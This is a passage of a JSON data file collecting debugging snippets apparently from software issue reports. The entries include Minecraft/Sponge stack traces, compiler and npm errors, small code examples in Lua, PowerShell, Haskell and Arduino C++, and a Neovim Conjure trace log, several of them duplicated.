*/\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.World.func_72939_s(World.java:6842)                                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.func_72939_s(WorldServer.java:2290)                                                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:767)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.dedicated.DedicatedServer.func_71190_q(DedicatedServer.java:397)                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:668)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.run(MinecraftServer.java:526)                                                                */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     java.lang.Thread.run(Thread.java:748)                                                                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* java.lang.NullPointerException: null                                                                                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.notifyBlockOfStateChange(PhaseTracker.java:691)                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.BlockTransaction$NeighborNotification.process(BlockTransaction.java:578)          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.MultiBlockCaptureSupplier.processTransactions(MultiBlockCaptureSupplier.java:727) */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:437)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:411)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:123)             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:71)              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.completePhase(PhaseTracker.java:318)                                         */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseContext.close(PhaseContext.java:613)                                                 */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.tickTileEntity(TrackingUtil.java:259)                                        */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.updateTileEntity(WorldServer.java:3167)                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.redirect$onUpdateTileEntities$zme000(WorldServer.java:3151)                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.World.func_72939_s(World.java:6842)                                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.func_72939_s(WorldServer.java:2290)                                                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:767)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.dedicated.DedicatedServer.func_71190_q(DedicatedServer.java:397)                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:668)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.run(MinecraftServer.java:526)                                                                */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     java.lang.Thread.run(Thread.java:748)                                                                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*****************************************************************************************************************************************/"
    },
    {
        "logs": "lua\r\n        describe(\"spies\", function()\r\n            it(\"replaces an original function\", function()\r\n                local t = {\r\n                    defaultmsg = \"hiii\",\r\n                    somerandomproperty = true,\r\n                }\r\n\r\n                function t:greet(msg) if msg then print(msg) else print(self.defaultmsg) end end\r\n\r\n                local s = spy.on(t, \"greet\")\r\n\r\n                t:greet(\"Hey!\") -- prints 'Hey!'\r\n                assert.spy(t.greet).was_called_with(t, \"Hey!\")\r\n\r\n                t:greet(\"Hey!\") -- prints 'Hey!'\r\n\r\n                -- when touching t the next assert fails\r\n                t.somerandomproperty = false\r\n                assert.spy(t.greet).was_called_with(t1, \"Hey!\")\r\n            end)\r\n        end)"
    },
    {
        "logs": "$a = Get-Foo | ConvertTo-Json\r\n$b = Get-Bar\r\n$c = Get-BarFoo\r\n$d = Get-FooBar\r\n$e = Get-FooFoo\r\n$f = Get-BarBar\r\n$g = Get-FooUsing -Parameter $a\r\nDo-SomethingThatChangesGlobalState"
    },
    {
        "logs": "#pureFunctions\r\n$a = Get-Foo | ConvertTo-Json\r\n$b = Get-Bar\r\n$c = Get-BarFoo\r\n$d = Get-FooBar\r\n$e = Get-FooFoo\r\n$f = Get-BarBar\r\n$g = Get-FooUsing -Parameter $a\r\nbarrier\r\nDo-SomethingThatChangesGlobalState\r\nbarrier"
    },
    {
        "logs": "$a = Get-Foo | ConvertTo-Json\r\n$b = Get-Bar\r\n$c = Get-BarFoo\r\n$d = Get-FooBar\r\n$e = Get-FooFoo\r\n$f = Get-BarBar\r\n$g = Get-FooUsing -Parameter $a\r\nDo-SomethingThatChangesGlobalState"
    },
    {
        "logs": "#pureFunctions\r\n$a = Get-Foo | ConvertTo-Json\r\n$b = Get-Bar\r\n$c = Get-BarFoo\r\n$d = Get-FooBar\r\n$e = Get-FooFoo\r\n$f = Get-BarBar\r\n$g = Get-FooUsing -Parameter $a\r\nbarrier\r\nDo-SomethingThatChangesGlobalState\r\nbarrier"
    },
    {
        "logs": "{\"detail\": \"RGW REST API failed request with status code 400\\n(b'{\\\"Code\\\":\\\"InvalidLocationConstraint\\\",\\\"Message\\\":\\\"The specified location-constr'\\n b'aint is not valid\\\",\\\"BucketName\\\":\\\"tst01\\\",\\\"RequestId\\\":\\\"tx00000000000000010cda3'\\n b'-005f4fa675-30219-s3\\\",\\\"HostId\\\":\\\"30219-s3-s3\\\"}')\", \"component\": \"rgw\"}"
    },
    {
        "logs": "foo/node_modules/arangojs/lib/cursor.js:48\r\n      self._index = self._result.length;\r\n                                ^\r\nTypeError: Cannot read property 'length' of undefined\r\n    at foo/node_modules/arangojs/lib/cursor.js:48:33\r\n    at foo/node_modules/arangojs/lib/cursor.js:25:32\r\n    at ArrayCursor.extend._more (foo/node_modules/arangojs/lib/cursor.js:32:25)\r\n    at ArrayCursor.extend._drain (foo/node_modules/arangojs/lib/cursor.js:23:10)\r\n    at ArrayCursor.extend.all (foo/node_modules/arangojs/lib/cursor.js:47:10)"
    },
    {
        "logs": "foo/node_modules/arangojs/lib/cursor.js:48\r\n      self._index = self._result.length;\r\n                                ^\r\nTypeError: Cannot read property 'length' of undefined\r\n    at foo/node_modules/arangojs/lib/cursor.js:48:33\r\n    at foo/node_modules/arangojs/lib/cursor.js:25:32\r\n    at ArrayCursor.extend._more (foo/node_modules/arangojs/lib/cursor.js:32:25)\r\n    at ArrayCursor.extend._drain (foo/node_modules/arangojs/lib/cursor.js:23:10)\r\n    at ArrayCursor.extend.all (foo/node_modules/arangojs/lib/cursor.js:47:10)"
    },
    {
        "logs": " = ? LIMIT 1'\r\n\tvar params = [ session_id ]\r\n\r\n\tthis.connection.query(sql, params, function(error, rows) {\r\n\t\t// ..\r\n\t})"
    },
    {
        "logs": " = ? LIMIT 1'\r\n\tvar params = [ this.options.databaseTable, session_id ]\r\n\r\n\tthis.connection.query(sql, params, function(error, rows) {\r\n\t\t// ..\r\n\t})"
    },
    {
        "logs": "test.js:6:12,20: rest array of spread operand\r\nThis type is incompatible with\r\n  test.js:2:30,35: number\r\n\r\nFound 1 error"
    },
    {
        "logs": "dup :: a -> (a, a)\r\ndup x = (x, x) -- Illegal!\r\n\r\nforget :: (a, b) -> a\r\nforget (a, b) = a -- Also illegal!\r\n\r\nchoose :: a -> b -> Either a b\r\nchoose a b =\r\n  if a == b\r\n    then Left a    -- Error, a was already used\r\n    else Right b  -- Error, b was already used"
    },
    {
        "logs": "dup :: a -> (a, a)\r\ndup x = (x, x) -- Illegal!\r\n\r\nforget :: (a, b) -> a\r\nforget (a, b) = a -- Also illegal!\r\n\r\nchoose :: a -> b -> Either a b\r\nchoose a b =\r\n  if a == b\r\n    then Left a    -- Error, a was already used\r\n    else Right b  -- Error, b was already used"
    },
    {
        "logs": "Feature :formatters cannot be installed. Unsupported Javascript context: Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/538.1 (KHTML, like Gecko) capybara-webkit Safari/538.1."
    },
    {
        "logs": "src\\haxe\\root\\Point.java:26: error: getY() in Point cannot implement getY() in IY\r\n        public int getY()\r\n                   ^\r\n  return type int is not compatible with double"
    },
    {
        "logs": "src\\haxe\\root\\Point.java:7: error: Point is not abstract and does not override abstract method getY() in IYInt\r\npublic class Point extends haxe.lang.HxObject implements haxe.root.IYInt, haxe.root.IYFloat\r\n       ^\r\nsrc\\haxe\\root\\Point.java:26: error: getY() in Point cannot implement getY() in IYInt\r\n        public double getY()\r\n                      ^\r\n  return type double is not compatible with int\r\n2 errors"
    },
    {
        "logs": "kuujo [11:07 PM]\r\n[...]. Basically, all the snapshots are stored in a single file. So a snapshot file will have a snapshot for primitive A, then primitive B, etc. \r\n\r\n[...]\r\n\r\n// some guy gets a OOM exception\r\nkuujo [6:46 PM]\r\nYeah... it seems like the only place that could conceivably happen is when taking snapshots of a very large set of state machines. The underlying array is dynamically resized, and if the bytes reach 1G + 1 I suspect it will be resized to "
    },
    {
        "logs": "kuujo [11:07 PM]\r\n[...]. Basically, all the snapshots are stored in a single file. So a snapshot file will have a snapshot for primitive A, then primitive B, etc. \r\n\r\n[...]\r\n\r\n// some guy gets a OOM exception\r\nkuujo [6:46 PM]\r\nYeah... it seems like the only place that could conceivably happen is when taking snapshots of a very large set of state machines. The underlying array is dynamically resized, and if the bytes reach 1G + 1 I suspect it will be resized to `Integer.MAX_VALUE`"
    },
    {
        "logs": "npm ERR! spawn ENOENT\r\nnpm ERR! \r\nnpm ERR! Failed at the functions@ lint script.\r\nnpm ERR! This is probably not a problem with npm. There is likely additional logging output above.\r\nnpm WARN Local package.json exists, but node_modules missing, did you mean to install?\r\n\r\nnpm ERR! A complete log of this run can be found in:\r\nnpm ERR!     /github/home/.npm/_logs/2020-09-03T12_50_56_138Z-debug.log\r\n\r\nError: functions predeploy error: Command terminated with non-zero exit code1"
    },
    {
        "logs": "/*\r\n *\r\n * This sketch emulates a Heart rate watch and is able to receive BLE signals of a Polar H7 Heart Rate Sensor.\r\n * It shows the received values in Serial and is also able to switch notificaton on the sensor on and off (using BLE2902)\r\n\r\n   Copyright <2017> <Andreas Spiess>\r\n\r\n  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"),\r\n  to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,\r\n  and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\r\n\r\n  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\r\n\r\n  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\r\n  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\r\n  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\r\n  DEALINGS IN THE SOFTWARE.\r\n\r\n   Based on Neil Kolban's example file: https://github.com/nkolban/ESP32_BLE_Arduino\r\n */\r\n\r\n#include \"BLEDevice.h\"\r\n//#include \"BLEScan.h\"\r\n\r\n// The remote service we wish to connect to.\r\nstatic BLEUUID serviceUUID(BLEUUID((uint16_t)0x181D));\r\n// The characteristic of the remote service we are interested in.\r\nstatic BLEUUID charUUID(BLEUUID((uint16_t)0x2A9D));\r\n\r\nstatic BLEAddress *pServerAddress;\r\nstatic BLEClient *pClient = NULL;\r\nstatic boolean doConnect = false;\r\nstatic boolean connected = false;\r\nstatic BLERemoteCharacteristic *pRemoteCharacteristic;\r\n\r\nconst uint8_t notificationOff[] = {0x0, 0x0};\r\nconst uint8_t notificationOn[] = {0x1, 0x0};\r\nbool onoff = true;\r\n\r\nstatic void notifyCallback(\r\n    BLERemoteCharacteristic *pBLERemoteCharacteristic,\r\n    uint8_t *pData,\r\n    size_t length,\r\n    bool isNotify)\r\n{\r\n\r\n    Serial.print(\"Notify callback for characteristic \");\r\n    for (int i = 0; i < length; i++)\r\n    {\r\n        Serial.print(pData[i]);\r\n        Serial.print(\" \");\r\n    }\r\n    Serial.println();\r\n}\r\n\r\n[Truncated]\n            Serial.println(\"We are now connected to the BLE Server.\");\r\n        }\r\n        else\r\n        {\r\n            Serial.println(\"We have failed to connect to the server; there is nothin more we will do.\");\r\n        }\r\n    }\r\n    else\r\n    {\r\n        if (onoff)\r\n        {\r\n            Serial.println(\"Notifications turned on\");\r\n            pRemoteCharacteristic->getDescriptor(BLEUUID((uint16_t)0x2902))->writeValue((uint8_t *)notificationOn, 2, true);\r\n            onoff = false;\r\n        }\r\n    }\r\n\r\n    delay(1000);\r\n}"
    },
    {
        "logs": "/*\r\n *\r\n * This sketch emulates a Heart rate watch and is able to receive BLE signals of a Polar H7 Heart Rate Sensor.\r\n * It shows the received values in Serial and is also able to switch notificaton on the sensor on and off (using BLE2902)\r\n\r\n   Copyright <2017> <Andreas Spiess>\r\n\r\n  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"),\r\n  to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,\r\n  and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\r\n\r\n  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\r\n\r\n  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\r\n  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\r\n  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\r\n  DEALINGS IN THE SOFTWARE.\r\n\r\n   Based on Neil Kolban's example file: https://github.com/nkolban/ESP32_BLE_Arduino\r\n */\r\n\r\n#include \"BLEDevice.h\"\r\n//#include \"BLEScan.h\"\r\n\r\n// The remote service we wish to connect to.\r\nstatic BLEUUID serviceUUID(BLEUUID((uint16_t)0x181D));\r\n// The characteristic of the remote service we are interested in.\r\nstatic BLEUUID charUUID(BLEUUID((uint16_t)0x2A9D));\r\n\r\nstatic BLEAddress *pServerAddress;\r\nstatic BLEClient *pClient = NULL;\r\nstatic boolean doConnect = false;\r\nstatic boolean connected = false;\r\nstatic BLERemoteCharacteristic *pRemoteCharacteristic;\r\n\r\nconst uint8_t notificationOff[] = {0x0, 0x0};\r\nconst uint8_t notificationOn[] = {0x1, 0x0};\r\nbool onoff = true;\r\n\r\nstatic void notifyCallback(\r\n    BLERemoteCharacteristic *pBLERemoteCharacteristic,\r\n    uint8_t *pData,\r\n    size_t length,\r\n    bool isNotify)\r\n{\r\n\r\n    Serial.print(\"Notify callback for characteristic \");\r\n    for (int i = 0; i < length; i++)\r\n    {\r\n        Serial.print(pData[i]);\r\n        Serial.print(\" \");\r\n    }\r\n    Serial.println();\r\n}\r\n\r\n[Truncated]\n            Serial.println(\"We are now connected to the BLE Server.\");\r\n        }\r\n        else\r\n        {\r\n            Serial.println(\"We have failed to connect to the server; there is nothin more we will do.\");\r\n        }\r\n    }\r\n    else\r\n    {\r\n        if (onoff)\r\n        {\r\n            Serial.println(\"Notifications turned on\");\r\n            pRemoteCharacteristic->getDescriptor(BLEUUID((uint16_t)0x2902))->writeValue((uint8_t *)notificationOn, 2, true);\r\n            onoff = false;\r\n        }\r\n    }\r\n\r\n    delay(1000);\r\n}"
    },
    {
        "logs": " Failed to list *unstructured.Unstructured: replicationcontrollers.extensions is forbidden:\r\n      Failed to list *unstructured.Unstructured: deploymentconfigs.apps.openshift.io \"rollback\" not found\r\n      Failed to list *unstructured.Unstructured: nodes is forbidden: \r\n     Failed to list *unstructured.Unstructured: imagesignatures.image.openshift.io is forbidden\r\n     Failed to list *unstructured.Unstructured: pods \"proxy\"\r\n     Failed to list *unstructured.Unstructured: deploymentconfigs.apps.openshift.io \"log\" not found\r\n "
    },
    {
        "logs": " Failed to list *unstructured.Unstructured: replicationcontrollers.extensions is forbidden:\r\n      Failed to list *unstructured.Unstructured: deploymentconfigs.apps.openshift.io \"rollback\" not found\r\n      Failed to list *unstructured.Unstructured: nodes is forbidden: \r\n     Failed to list *unstructured.Unstructured: imagesignatures.image.openshift.io is forbidden\r\n     Failed to list *unstructured.Unstructured: pods \"proxy\"\r\n     Failed to list *unstructured.Unstructured: deploymentconfigs.apps.openshift.io \"log\" not found\r\n "
    },
    {
        "logs": "20-04-08 19:49:44 arch-desktop INFO [conjure.main:39] - Logging initialised\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.main:41] - System versions\r\n=== Conjure ===\r\nv2.1.2-2-gd3356a4de4\r\n\r\n=== OS ===\r\nLinux arch-desktop 5.4.6-arch1-1 #1 SMP PREEMPT Sat, 21 Dec 2019 16:34:41 +0000 x86_64 GNU/Linux\r\n\r\n=== Neovim ===\r\nNVIM v0.4.3\r\nBuild type: Release\r\nLuaJIT 2.0.5\r\nCompilation: /usr/bin/cc -march=x86-64 -mtune=generic -O2 -pipe -fno-plt -O2 -DNDEBUG -DMIN_LOG_LEVEL=3 -Wall -Wextra -pedantic -Wno-unused-parameter -Wstrict-prototypes -std=gnu99 -Wshadow -Wconversion -Wmissing-prototypes -Wimplicit-fallthrough -Wvla -fstack-protector-strong -fdiagnostics-color=always -DINCLUDE_GENERATED_DECLARATIONS -D_GNU_SOURCE -DNVIM_MSGPACK_HAS_FLOAT32 -DNVIM_UNIBI_HAS_VAR_FROM -I/build/neovim/src/build/config -I/build/neovim/src/neovim-0.4.3/src -I/usr/include -I/build/neovim/src/build/src/nvim/auto -I/build/neovim/src/build/include\r\nCompiled by builduser\r\n\r\nFeatures: +acl +iconv +tui\r\nSee \":help feature-compile\"\r\n\r\n   system vimrc file: \"$VIM/sysinit.vim\"\r\n  fall-back for $VIM: \"/usr/share/nvim\"\r\n\r\nRun :checkhealth for more info\r\n\r\n=== Java ===\r\nopenjdk version \"1.8.0_232\"\r\nOpenJDK Runtime Environment (build 1.8.0_232-b09)\r\nOpenJDK 64-Bit Server VM (build 25.232-b09, mixed mode)\r\n\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.rpc:195] - Starting RPC TCP server on port 39803\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.rpc:207] - Starting RPC loops\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.prepl:243] - Started prepl server on port 40361\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :notify, :method :up, :params [\"\"], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-set-var, :params [\"conjure_ready\" 1]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-get-current-buf, :params nil}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result nil, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.main:46] - Everything's ready! Let's perform some magic.\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]}, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[\"/home/colin/projects/aok-elo-graph-front-end/src/aok_elo_graph_front_end/core.cljs\" 42 [\"(ns ^:figwheel-hooks aok-elo-graph-front-end.core\" \"  (:require\" \"   [goog.dom :as gdom]\" \"   [reagent.core :as reagent :refer [atom]]))\" \"\" \"(println \\\"This text is printed from src/aok_elo_graph_front_end/core.cljs. Go ahead and edit it and see reloading in action.\\\")\" \"\" \"(defn multiply [a b] (* a b))\" \"\" \"\" \";; define your app data so that it doesn't get over-written on reload\" \"(defonce app-state (atom {:text \\\"cats\\\"}))\" \"\" \"(defn get-app-element []\" \"  (gdom/getElement \\\"app\\\"))\" \"\" \"(defn hello-world []\" \"  [:div\" \"   [:h1 (:text @app-state)]\" \"   [:h3 \\\"Edit this in src/aok_elo_graph_front_end/core.cljs and watch it change!\\\"]])\" \"\" \"(defn mount [el]\" \"  (reagent/render-component [hello-world] el))\" \"\" \"(defn mount-app-element []\"] #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x1253eb17 \"[B@1253eb17\"]} \"/home/colin/projects/aok-elo-graph-front-end\"] nil], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.prepl:131] - Adding :pfig 127.0.0.1 6776\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-get-var, :params [\"conjure_log_blacklist\"]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-execute-lua, :params [\"return require('conjure').upsert_log(...)\" (\"/tmp/conjure.cljc\" \"small\" false false true)]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :notify, :method :clear-virtual, :params [0], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-get-current-buf, :params nil}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result {\"buf\" 3, \"win\" 1001}, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]}, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-buf-line-count, :params [3]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[\"/home/colin/projects/aok-elo-graph-front-end/src/aok_elo_graph_front_end/core.cljs\" 42 [\"(ns ^:figwheel-hooks aok-elo-graph-front-end.core\" \"  (:require\" \"   [goog.dom :as gdom]\" \"   [reagent.core :as reagent :refer [atom]]))\" \"\" \"(println \\\"This text is printed from src/aok_elo_graph_front_end/core.cljs. Go ahead and edit it and see reloading in action.\\\")\" \"\" \"(defn multiply [a b] (* a b))\" \"\" \"\" \";; define your app data so that it doesn't get over-written on reload\" \"(defonce app-state (atom {:text \\\"cats\\\"}))\" \"\" \"(defn get-app-element []\" \"  (gdom/getElement \\\"app\\\"))\" \"\" \"(defn hello-world []\" \"  [:div\" \"   [:h1 (:text @app-state)]\" \"   [:h3 \\\"Edit this in src/aok_elo_graph_front_end/core.cljs and watch it change!\\\"]])\" \"\" \"(defn mount [el]\" \"  (reagent/render-component [hello-world] el))\" \"\" \"(defn mount-app-element []\"] #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0xada2253 \"[B@ada2253\"]} \"/home/colin/projects/aok-elo-graph-front-end\"] nil], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result 1, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_set_lines\" [3 0 1 false [\"; conjure/out | Welcome to Conjure! (v2.1.2-2-gd3356a4de4)\"]]] [\"nvim_buf_set_lines\" [3 -1 -1 false (\"; conjure/up | Adding :pfig\")]] [\"nvim_win_set_cursor\" [1001 [2 0]]])]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-create-namespace, :params [\"conjure_virtual_text\"]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[nil nil nil] nil], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.prepl:64] - Connecting through remote-prepl :pfig\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-win-get-cursor, :params [#msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x1253eb17 \"[B@1253eb17\"]}]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result 2, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [1 0], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-buf-clear-namespace, :params [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]} 2 0 -1]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result nil, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_clear_namespace\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]} 2 0 -1]] [\"nvim_buf_set_virtual_text\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]} 2 0 [[\"@> Assessing :pfig\" \"comment\"]] {}]])]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[nil 2] nil], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.prepl:151] - Fetching current deps.\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.prepl:68] - Read from remote-prepl :pfig - 